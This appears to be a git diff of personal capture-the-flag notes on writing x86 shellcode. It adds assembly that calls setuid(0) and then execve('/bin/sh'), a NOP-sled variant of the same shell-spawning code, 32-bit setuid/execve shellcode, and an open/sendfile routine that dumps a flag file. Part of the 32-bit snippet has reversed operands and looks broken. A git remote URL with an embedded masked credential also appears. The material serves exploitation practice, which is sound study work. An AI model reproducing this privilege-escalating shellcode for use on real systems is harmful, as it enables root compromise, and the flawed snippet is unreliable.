@@ -3,12 +3,20 @@
 .global _start
 _start:
 .intel_syntax noprefix
-mov rax, 59		# this is the syscall number of execve
-lea rdi, [rip+binsh]	# points the first argument of execve at the /bin/sh string below
-mov rsi, 0		# this makes the second argument, argv, NULL
-mov rdx, 0		# this makes the third argument, envp, NULL
-syscall			# this triggers the system call
-binsh:				# a label marking where the /bin/sh string is
+
+push 0 #006a
+pop rdi #5f
+push 105 #696a
+pop rax #58
+syscall #050f
+
+
+mov rax, 59 #0xc748
+lea rdi, [rip+binsh] #0x8d48	
+mov rsi, 0	#0xc748
+mov rdx, 0	#0xc748
+syscall	#0x050f	
+binsh:
 .string "/bin/sh"
 ```
 
@@ -60,13 +68,13 @@ binsh:                          # a label marking where the /bin/sh string is
 _start:
 .intel_syntax noprefix
 #int3
-lea edi, [rip+flag]    # points the first argument of execve at the /bin/sh string below
-mov eax, 2                              # syscall number of open
-mov esi, 0                              # NULL out the second argument (meaning, O_RDONLY)
+lea edi, [rip+flag]    
+mov eax, 2                              
+mov esi, 0                             
 syscall
-mov edi, 1                              # first argument to sendfile is the file descriptor to output to (stdout)
-mov esi, eax                            # second argument is the file descriptor returned by open
-mov edx, 0                              # third argument is the number of bytes to skip from the input file
+mov edi, 1                              
+mov esi, eax                            
+mov edx, 0                              
 mov r10, 1000                           # fourth argument is the number of bytes to transfer to the output file
 mov eax, 40                             # syscall number of sendfile
 syscall                         # trigger sendfile(1, fd, 0, 1000)
@@ -158,3 +166,85 @@ flag:
 
 # NEW GIT 
 + git remote set-url origin https://littlefoot22:********@github.com/littlefoot22/ctf-public.git
+
+
+#
+```s
+
+.global _start
+_start:
+.intel_syntax noprefix
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+mov rax, 59             # this is the syscall number of execve
+lea rdi, [rip+binsh]    # points the first argument of execve at the /bin/sh string below
+mov rsi, 0              # this makes the second argument, argv, NULL
+mov rdx, 0              # this makes the third argument, envp, NULL
+syscall                 # this triggers the system call
+binsh:                          # a label marking where the /bin/sh string is
+.string "/bin/sh"
+```
+
+
+ 
+# setuid(0)
+push   0x17
+pop    eax
+xor    ebx,ebx
+int    0x80
+
+
+# /bin/sh
+push   0xb
+pop    eax
+cltd   
+push   edx
+push   0x68732f2f
+push   0x6e69622f
+mov    esp, ebx
+push   edx
+push   ebx
+mov    esp, ecx
+int    0x80
